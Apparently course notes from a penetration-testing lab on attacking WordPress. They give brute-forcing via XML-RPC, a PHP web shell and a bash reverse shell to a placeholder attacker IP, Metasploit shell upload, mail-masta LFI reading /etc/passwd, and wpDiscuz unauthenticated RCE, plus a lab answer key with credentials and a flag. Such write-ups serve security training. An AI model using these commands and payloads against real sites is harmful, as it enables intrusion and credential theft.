# Section 4 — Attacking WordPress

## ID
532

## Module
Attacking Common Applications

## Kind
notes

## Title
Section 4 — Attacking WordPress

## Description
Covers WordPress attack techniques including WPScan brute forcing via XML-RPC, theme editor RCE, Metasploit shell upload, and exploiting vulnerable plugins (mail-masta LFI, wpDiscuz unauthenticated RCE).

## Tags
wordpress, wpscan, brute-force, rce, lfi, xmlrpc, metasploit

## Commands
- `wpscan --password-attack xmlrpc -t 20 -U <USER> -P <WORDLIST> --url http://<TARGET>`
- `curl -s http://<TARGET>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`
- `curl http://<TARGET>/wp-content/themes/twentynineteen/404.php?0=id`
- `python3 wp_discuz.py -u http://<TARGET> -p /?p=1`
- `curl -s http://<TARGET>/wp-content/uploads/<YEAR>/<MONTH>/<WEBSHELL>.php?cmd=id`
- `msfconsole -q -x "use exploit/unix/webapp/wp_admin_shell_upload"`

## What This Section Covers
How to attack WordPress once enumeration is complete: brute-forcing credentials via XML-RPC, achieving code execution through the Theme Editor or Metasploit's shell upload module, and exploiting known plugin vulnerabilities (mail-masta LFI and wpDiscuz unauthenticated RCE). The attack chain typically flows from user enumeration → credential brute-force → admin panel access → code execution.

## Methodology

1. **Brute-force credentials via XML-RPC** (faster than wp-login):
   ```
   wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
   ```
   XML-RPC method is preferred over wp-login because it's significantly faster.

2. **Log in to wp-admin** with recovered credentials.

3. **RCE via Theme Editor** — Appearance → Theme Editor → select an **inactive** theme (e.g., Twenty Nineteen) → edit `404.php` → add web shell:
   ```php
   system($_GET[0]);
   ```
   Then trigger it:
   ```
   curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
   ```

4. **Upgrade to reverse shell** — instead of the simple web shell, inject:
   ```php
   exec("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1'");
   ```
   Set up listener with `nc -nvlp <PORT>`, then browse to the edited 404.php to trigger the callback.

5. **Alternative: Metasploit wp_admin_shell_upload**:
   ```
   use exploit/unix/webapp/wp_admin_shell_upload
   set USERNAME doug
   set PASSWORD jessica1
   set RHOSTS <TARGET_IP>
   set VHOST blog.inlanefreight.local
   set LHOST <ATTACKER_IP>
   exploit
   ```
   Uploads a malicious plugin, executes PHP Meterpreter, then cleans up. Must set both RHOSTS and VHOST or it fails with "not-found" error.

## Exploiting Vulnerable Plugins

### mail-masta 1.0 — Unauthenticated LFI
The `pl` parameter in `count_of_send.php` includes files with zero validation:
```php
include($_GET['pl']);
```
Exploit:
```
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
Grep for real users:
```
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd | grep "/bin/bash"
```

### wpDiscuz 7.0.4 — Unauthenticated RCE (CVE-2020-24186)
File upload bypass — mime type check is bypassable, allowing PHP upload:
```
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```
If the exploit script fails to execute commands directly, use cURL with the uploaded shell:
```
curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/<SHELL_NAME>.php?cmd=id
```
The uploaded shell starts with `GIF689a;` (GIF magic bytes to bypass mime checks).

## WordPress Vulnerability Statistics

| Category | Percentage |
|----------|-----------|
| Plugins | 89% |
| Themes | 7% |
| WordPress core | 4% |

~23,595 vulnerabilities in WPScan DB at time of writing.

## Artifact Cleanup & Reporting

Always document in your report appendices:
- Exploited systems (hostname/IP + exploitation method)
- Compromised users (account name, method, local vs domain)
- Artifacts created on systems (uploaded shells, modified files)
- Changes made (added users, modified group membership)

## Lab — Questions & Answers

| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Other user besides admin | doug | `wpscan --url http://blog.inlanefreight.local --enumerate` → Author ID brute forcing |
| Q2: Doug's password | jessica1 | `wpscan --password-attack xmlrpc -t 20 -U doug -P rockyou.txt --url blog.inlanefreight.local` |
| Q3: System user with /bin/bash shell | webadmin | mail-masta LFI: `curl -s blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd \| grep /bin/bash` → root, ubuntu, webadmin |
| Q4: flag.txt in webroot | l00k_ma_unAuth_rc3! | Login as doug → Theme Editor → Twenty Nineteen → 404.php → inject reverse shell → `cat /var/www/blog.inlanefreight.local/flag_*.txt` |

## Key Takeaways

- **XML-RPC brute-force is faster than wp-login** — always use `--password-attack xmlrpc` with WPScan
- **Edit an inactive theme** for code execution to avoid breaking the site — never modify the active theme
- **Metasploit requires both RHOSTS (IP) and VHOST** when targeting vhost-based WordPress — omitting VHOST causes "not-found" errors
- **mail-masta LFI is unauthenticated** — no credentials needed, just hit the vulnerable PHP file directly
- **wpDiscuz RCE is also unauthenticated** — file upload bypass via mime type check evasion; the exploit script may fail but the shell still uploads
- **waybackurls** can reveal old plugin installs that are still accessible even if no longer linked — developers often forget to remove plugins they stop using
- **Always clean up artifacts** and document everything you upload or modify during testing

## Gotchas

- wpDiscuz exploit script may report failure to execute PHP code, but the shell still uploaded successfully — check with cURL manually
- Metasploit's `wp_admin_shell_upload` auto-cleans its uploaded plugin, but verify deletion and report the artifact regardless
- The flag file in the lab has a hash in its filename (`flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt`) — use `cat /var/www/blog.inlanefreight.local/flag_*.txt` or `ls` the directory
- When injecting a reverse shell in 404.php, use `exec()` not `system()` — and ensure your listener is running before browsing to the page
